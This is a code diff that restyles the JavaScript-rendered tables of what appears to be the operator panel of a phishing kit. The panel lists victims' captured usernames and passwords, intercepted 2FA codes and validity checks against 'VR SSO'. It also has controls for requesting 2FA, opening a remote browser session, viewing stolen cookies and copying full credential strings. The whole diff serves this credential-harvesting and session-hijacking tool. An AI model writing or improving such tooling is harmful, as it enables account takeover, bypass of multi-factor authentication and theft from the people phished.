@@ -390,14 +390,10 @@ function renderizarAuditoria() {
     <table>
       <thead>
         <tr>
-          <th>Data / Hora</th>
-          <th>Tenant</th>
-          <th>Evento</th>
-          <th>Usuário Alvo</th>
-          <th>Status</th>
-          <th>Latência</th>
-          <th>Detalhes Técnicos</th>
-          <th>IP Origem</th>
+          <th style="width: 18%;">Timestamp & Tenant</th>
+          <th style="width: 22%;">Evento & Latência</th>
+          <th style="width: 24%;">Usuário & Status</th>
+          <th style="width: 36%;">Detalhes da Operação</th>
         </tr>
       </thead>
       <tbody>
@@ -427,36 +423,46 @@ function renderizarAuditoria() {
     }
 
     const durSec = item.duration_ms > 0 ? (item.duration_ms / 1000).toFixed(2) : 0;
-    let latencyBadge = `<span style="color: var(--text-dim);">—</span>`;
+    let latencyBadge = `<span style="color: var(--text-dim); font-size: 10px;">—</span>`;
     if (item.duration_ms > 0) {
       const isFast = item.duration_ms <= 3500;
       const isOk = item.duration_ms <= 5000;
       const latClass = isFast ? "latency-fast" : (isOk ? "latency-badge" : "latency-warning");
-      latencyBadge = `<span class="latency-badge ${latClass}">⚡ ${durSec}s</span>`;
+      latencyBadge = `<span class="latency-badge ${latClass}" style="padding: 1px 5px; font-size: 10px;">⚡ ${durSec}s</span>`;
     }
 
     const detailsStr = typeof item.details === "object" ? JSON.stringify(item.details) : (item.details || "");
 
     html += `
       <tr>
-        <td style="color: var(--text-dim); font-size: 12px; white-space: nowrap;">${item.timestamp || "—"}</td>
-        <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
         <td>
-          <span style="display: inline-flex; align-items: center; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; font-family: 'JetBrains Mono', monospace; background: ${evBg}; color: ${evColor}; border: 1px solid ${evBorder};">
-            ${escapeHtml(item.event_type || "LOG")}
-          </span>
+          <div style="color: var(--text); font-size: 12px; font-weight: 600;">${item.timestamp || "—"}</div>
+          <div style="margin-top: 3px;"><span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span></div>
         </td>
-        <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
         <td>
-          <span class="status-badge ${item.status === 'SUCCESS' ? 'status-complete' : (item.status === 'FAILED' ? 'status-rejected' : 'status-waiting')}">
-            ${escapeHtml(item.status || "INFO")}
-          </span>
+          <div>
+            <span style="display: inline-flex; align-items: center; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 700; font-family: 'JetBrains Mono', monospace; background: ${evBg}; color: ${evColor}; border: 1px solid ${evBorder};">
+              ${escapeHtml(item.event_type || "LOG")}
+            </span>
+          </div>
+          <div style="display: flex; align-items: center; gap: 5px; margin-top: 3px;">
+            ${latencyBadge}
+            <span style="color: var(--text-dim); font-size: 10px; font-family: 'JetBrains Mono', monospace;">${escapeHtml(item.ip || "—")}</span>
+          </div>
         </td>
-        <td>${latencyBadge}</td>
-        <td style="max-width: 320px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #a1a1aa;" title="${escapeHtml(detailsStr)}">
+        <td>
+          <div class="user-tag mono" style="font-size: 11px; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
+            ${escapeHtml(item.usuario || "—")}
+          </div>
+          <div style="margin-top: 3px;">
+            <span class="status-badge ${item.status === 'SUCCESS' ? 'status-complete' : (item.status === 'FAILED' ? 'status-rejected' : 'status-waiting')}" style="padding: 1px 6px; font-size: 10px;">
+              ${escapeHtml(item.status || "INFO")}
+            </span>
+          </div>
+        </td>
+        <td style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #a1a1aa; line-height: 1.4; word-break: break-all;" title="${escapeHtml(detailsStr)}">
           ${escapeHtml(detailsStr)}
         </td>
-        <td style="color: var(--text-dim); font-size: 11px; font-family: 'JetBrains Mono', monospace;">${escapeHtml(item.ip || "—")}</td>
       </tr>
     `;
   });
@@ -694,14 +700,10 @@ function renderizarTabela() {
       <table>
         <thead>
           <tr>
-            <th>Data / Hora</th>
-            <th>Tenant</th>
-            <th>Usuário (CPF / E-mail)</th>
-            <th>Senha Capturada</th>
-            <th>Auditoria VR SSO</th>
-            <th>Código 2FA</th>
-            <th>Status</th>
-            <th style="text-align: right;">Ações de Controle</th>
+            <th style="width: 18%;">Registro & Tenant</th>
+            <th style="width: 28%;">Credencial (Usuário & Senha)</th>
+            <th style="width: 26%;">Auditoria SSO & 2FA</th>
+            <th style="width: 28%; text-align: right;">Ações Operacionais</th>
           </tr>
         </thead>
         <tbody>
@@ -712,84 +714,104 @@ function renderizarTabela() {
       const st2FA = item.status_2fa;
       const stLogin = item.status_login || "aguardando_solicitacao";
 
-      let statusHtml = `<span class="status-badge status-waiting">Login Capturado</span>`;
+      let statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Login Capturado</span>`;
       if (tem2FA) {
         if (st2FA === "aceito") {
-          statusHtml = `<span class="status-badge status-complete">2FA Aceito</span>`;
+          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">2FA Aceito</span>`;
         } else if (st2FA === "negado") {
-          statusHtml = `<span class="status-badge status-rejected">2FA Negado</span>`;
+          statusHtml = `<span class="status-badge status-rejected" style="padding: 1px 6px; font-size: 10px;">2FA Negado</span>`;
         } else {
-          statusHtml = `<span class="status-badge status-pending">Aguardando Decisão</span>`;
+          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">Aguardando Decisão</span>`;
         }
       } else {
         if (stLogin === "solicitar_2fa") {
-          statusHtml = `<span class="status-badge status-pending">2FA Solicitado</span>`;
+          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">2FA Solicitado</span>`;
         } else {
-          statusHtml = `<span class="status-badge status-waiting">Aguardando Operador</span>`;
+          statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Aguardando Operador</span>`;
         }
       }
 
-      let auditHtml = `<span class="cred-badge cred-testing"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando na VR...</span>`;
+      let auditHtml = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando na VR...</span>`;
       if (item.status_credencial === "valido") {
-        auditHtml = `<span class="cred-badge cred-valid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Correta (MFA Real)</span>`;
+        auditHtml = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Correta (MFA Real)</span>`;
       } else if (item.status_credencial === "bloqueio_captcha") {
-        auditHtml = `<span class="cred-badge cred-captcha" style="background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha VR</span>`;
+        auditHtml = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 2px 6px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg> Desafio Captcha VR</span>`;
       } else if (item.status_credencial === "invalido") {
-        auditHtml = `<span class="cred-badge cred-invalid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta na VR</span>`;
+        auditHtml = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 2px 6px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta na VR</span>`;
       }
 
       const codigoHtml = tem2FA
-        ? `<span class="code-badge mono">${item.ultimoCodigo}</span>`
-        : `<span class="code-badge-empty">—</span>`;
+        ? `<span class="code-badge mono" style="font-size: 11px; padding: 2px 6px;">${item.ultimoCodigo}</span>`
+        : `<span class="code-badge-empty" style="font-size: 11px;">—</span>`;
 
       const credCompleta = `${item.usuario || ""}:${item.ultimaSenha || ""}${tem2FA ? `:${item.ultimoCodigo}` : ""}`;
 
       html += `
         <tr>
-          <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
-          <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
-          <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
+          <!-- Coluna 1: Registro & Tenant (2 Linhas) -->
           <td>
-            <div class="secret-box">
-              <span class="mono">${escapeHtml(item.ultimaSenha || "—")}</span>
-              <button class="icon-btn" type="button" title="Copiar senha" onclick="copiarTexto('${escapeQuotes(item.ultimaSenha)}', 'Senha')">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
-              </button>
+            <div style="font-size: 12px; font-weight: 600; color: #fff; line-height: 1.3;">${item.data_hora || "—"}</div>
+            <div style="margin-top: 4px;">
+              <span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span>
             </div>
           </td>
-          <td>${auditHtml}</td>
+
+          <!-- Coluna 2: Credencial (Usuário & Senha) (2 Linhas) -->
           <td>
-            <div style="display: inline-flex; align-items: center; gap: 6px;">
+            <div class="user-tag mono" style="font-size: 12px; max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
+              ${escapeHtml(item.usuario || "—")}
+            </div>
+            <div style="display: flex; align-items: center; gap: 6px; margin-top: 4px;">
+              <div class="secret-box" style="padding: 2px 6px; font-size: 11px;">
+                <span class="mono">${escapeHtml(item.ultimaSenha || "—")}</span>
+                <button class="icon-btn" type="button" title="Copiar senha" onclick="copiarTexto('${escapeQuotes(item.ultimaSenha)}', 'Senha')">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                </button>
+              </div>
+            </div>
+          </td>
+
+          <!-- Coluna 3: Auditoria SSO & 2FA (2 Linhas) -->
+          <td>
+            <div>${auditHtml}</div>
+            <div style="display: flex; align-items: center; gap: 5px; margin-top: 4px;">
+              ${statusHtml}
               ${codigoHtml}
               ${tem2FA ? `
                 <button class="icon-btn" type="button" title="Copiar código 2FA" onclick="copiarTexto('${escapeQuotes(item.ultimoCodigo)}', 'Código 2FA')">
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                 </button>
               ` : ''}
             </div>
           </td>
-          <td>${statusHtml}</td>
+
+          <!-- Coluna 4: Ações Operacionais (2 Linhas de botões compactos) -->
           <td style="text-align: right;">
-            <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
-              <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 5px 8px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Abrir Navegador Remoto em Tempo Real">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                <span>Remota</span>
-              </a>
-              ${gerarBotoesAcaoConsolidado(item)}
-              ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
-                <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 5px 10px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(2, 215, 47, 0.35);" title="Acessar Sessão Autenticada Finalizada">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                  <span>Acessar Sessão</span>
+            <div style="display: flex; flex-direction: column; gap: 4px; align-items: flex-end;">
+              <!-- Linha 1 de Ações -->
+              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
+                <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Navegador Remoto">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                  <span>Remota</span>
                 </a>
-                <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 10px; font-size: 11px;" type="button" title="Visualizar e copiar cookies da sessão autenticada" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
-                  <span>Cookies (${item.total_cookies || 'OK'})</span>
+                ${gerarBotoesAcaoConsolidado(item)}
+              </div>
+
+              <!-- Linha 2 de Ações -->
+              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
+                ${(item.total_cookies > 0 || item.cookies || item.tem_sessao_salva || item.status === '2FA Aceito') ? `
+                  <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 3px 7px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
+                    <span>Sessão</span>
+                  </a>
+                  <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 3px 7px; font-size: 11px;" type="button" title="Cookies" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
+                    <span>Cookies (${item.total_cookies || 'OK'})</span>
+                  </button>
+                ` : ''}
+                <button class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px;" type="button" title="Copiar credenciais completas" onclick="copiarTexto('${escapeQuotes(credCompleta)}', 'Credenciais')">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                  <span>Copiar</span>
                 </button>
-              ` : ''}
-              <button class="btn btn-secondary" style="padding: 5px 10px; font-size: 11px;" type="button" title="Copiar credenciais completas" onclick="copiarTexto('${escapeQuotes(credCompleta)}', 'Credenciais completas')">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
-                <span>Copiar</span>
-              </button>
+              </div>
             </div>
           </td>
         </tr>
@@ -829,14 +851,10 @@ function renderizarTabela() {
       <table>
         <thead>
           <tr>
-            <th>Data / Hora</th>
-            <th>Tenant</th>
-            <th>Evento</th>
-            <th>Usuário</th>
-            <th>Dado Capturado</th>
-            <th>Auditoria VR</th>
-            <th>Status / Decisão</th>
-            <th style="text-align: right;">Ações</th>
+            <th style="width: 18%;">Registro & Tenant</th>
+            <th style="width: 28%;">Tipo & Dado Capturado</th>
+            <th style="width: 26%;">Auditoria & Status</th>
+            <th style="width: 28%; text-align: right;">Ações Operacionais</th>
           </tr>
         </thead>
         <tbody>
@@ -845,8 +863,8 @@ function renderizarTabela() {
     filtrados.forEach(item => {
       const is2FA = item.tipo === "2FA";
       const tipoBadge = is2FA
-        ? `<span class="type-badge type-2fa">2FA</span>`
-        : `<span class="type-badge type-login">LOGIN</span>`;
+        ? `<span class="type-badge type-2fa" style="font-size: 10px; padding: 1px 5px;">2FA</span>`
+        : `<span class="type-badge type-login" style="font-size: 10px; padding: 1px 5px;">LOGIN</span>`;
 
       const dadoTexto = is2FA ? item.codigo : item.senha;
 
@@ -854,67 +872,90 @@ function renderizarTabela() {
       if (is2FA) {
         const st = item.status_2fa || "pendente";
         if (st === "aceito") {
-          statusHtml = `<span class="status-badge status-complete">Aceito</span>`;
+          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">Aceito</span>`;
         } else if (st === "negado") {
-          statusHtml = `<span class="status-badge status-rejected">Negado</span>`;
+          statusHtml = `<span class="status-badge status-rejected" style="padding: 1px 6px; font-size: 10px;">Negado</span>`;
         } else {
-          statusHtml = `<span class="status-badge status-pending">Pendente</span>`;
+          statusHtml = `<span class="status-badge status-pending" style="padding: 1px 6px; font-size: 10px;">Pendente</span>`;
         }
       } else {
         const stLogin = item.status_login || "aguardando_solicitacao";
         if (stLogin === "solicitar_2fa") {
-          statusHtml = `<span class="status-badge status-complete">2FA Solicitado</span>`;
+          statusHtml = `<span class="status-badge status-complete" style="padding: 1px 6px; font-size: 10px;">2FA Solicitado</span>`;
         } else {
-          statusHtml = `<span class="status-badge status-waiting">Aguardando Operador</span>`;
+          statusHtml = `<span class="status-badge status-waiting" style="padding: 1px 6px; font-size: 10px;">Aguardando Operador</span>`;
         }
       }
 
       let auditFeed = `—`;
       if (!is2FA) {
         if (item.status_credencial === "valido") {
-          auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px;">Válido</span>`;
+          auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px; padding: 1px 5px;">Válido</span>`;
         } else if (item.status_credencial === "bloqueio_captcha") {
-          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha VR</span>`;
+          auditFeed = `<span class="cred-badge cred-captcha" style="font-size: 10px; padding: 1px 5px; background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.4);">Captcha VR</span>`;
         } else if (item.status_credencial === "invalido") {
-          auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px;">Incorreto</span>`;
+          auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px; padding: 1px 5px;">Incorreto</span>`;
         } else {
-          auditFeed = `<span class="cred-badge cred-testing" style="font-size: 10px;">Testando</span>`;
+          auditFeed = `<span class="cred-badge cred-testing" style="font-size: 10px; padding: 1px 5px;">Testando</span>`;
         }
       }
 
       html += `
         <tr>
-          <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
-          <td><span class="tenant-badge">${escapeHtml(item.tenant || "default")}</span></td>
-          <td>${tipoBadge}</td>
-          <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
+          <!-- Coluna 1: Registro & Tenant (2 Linhas) -->
           <td>
-            <div class="secret-box">
-              <span class="mono">${escapeHtml(dadoTexto || "—")}</span>
+            <div style="font-size: 12px; font-weight: 600; color: #fff; line-height: 1.3;">${item.data_hora || "—"}</div>
+            <div style="margin-top: 4px;"><span class="tenant-badge" style="font-size: 10px; padding: 1px 6px;">${escapeHtml(item.tenant || "default")}</span></div>
+          </td>
+
+          <!-- Coluna 2: Tipo & Dado Capturado (2 Linhas) -->
+          <td>
+            <div style="display: flex; align-items: center; gap: 6px;">
+              ${tipoBadge}
+              <span class="user-tag mono" style="font-size: 12px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(item.usuario || '')}">
+                ${escapeHtml(item.usuario || "—")}
+              </span>
+            </div>
+            <div style="display: flex; align-items: center; gap: 6px; margin-top: 4px;">
+              <div class="secret-box" style="padding: 2px 6px; font-size: 11px;">
+                <span class="mono">${escapeHtml(dadoTexto || "—")}</span>
+                <button class="icon-btn" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                </button>
+              </div>
             </div>
           </td>
-          <td>${auditFeed}</td>
-          <td>${statusHtml}</td>
+
+          <!-- Coluna 3: Auditoria & Status (2 Linhas) -->
+          <td>
+            <div>${auditFeed}</div>
+            <div style="margin-top: 4px;">${statusHtml}</div>
+          </td>
+
+          <!-- Coluna 4: Ações (2 Linhas) -->
           <td style="text-align: right;">
-            <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
-              <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 4px 8px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Abrir Navegador Remoto em Tempo Real">
-                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                <span>Remota</span>
-              </a>
-              ${gerarBotoesAcaoFeed(item)}
-              ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
-                <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 4px 8px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
-                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                  <span>Acessar</span>
+            <div style="display: flex; flex-direction: column; gap: 4px; align-items: flex-end;">
+              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
+                <a href="/sessaoremota.html?usuario=${encodeURIComponent(item.usuario)}${item.tenant ? `&tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px; display: inline-flex; align-items: center; gap: 4px;" title="Navegador Remoto">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                  <span>Remota</span>
                 </a>
-                <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 5px 8px; font-size: 11px;" type="button" title="Cookies de Sessão" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
-                  <span>Cookies</span>
+                ${gerarBotoesAcaoFeed(item)}
+              </div>
+              <div style="display: flex; align-items: center; gap: 4px; justify-content: flex-end;">
+                ${(item.total_cookies > 0 || item.cookies || item.status_2fa === 'aceito') ? `
+                  <a href="/sessao/${encodeURIComponent(item.usuario)}${item.tenant ? `?tenant=${encodeURIComponent(item.tenant)}` : ''}" target="_blank" class="btn btn-success-sm" style="background: var(--accent-green); color: #09090b; text-decoration: none; padding: 3px 7px; font-size: 11px; font-weight: 700; box-shadow: 0 0 8px rgba(2, 215, 47, 0.3);" title="Acessar Sessão">
+                    <span>Sessão</span>
+                  </a>
+                  <button class="btn btn-success-sm" style="background: rgba(2, 215, 47, 0.15); border-color: rgba(2, 215, 47, 0.4); color: var(--accent-green); padding: 3px 7px; font-size: 11px;" type="button" title="Cookies" onclick="abrirModalCookies('${escapeQuotes(item.usuario)}')">
+                    <span>Cookies</span>
+                  </button>
+                ` : ''}
+                <button class="btn btn-secondary" style="padding: 3px 7px; font-size: 11px;" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
+                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+                  <span>Copiar</span>
                 </button>
-              ` : ''}
-              <button class="icon-btn" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
-              </button>
+              </div>
             </div>
           </td>
         </tr>
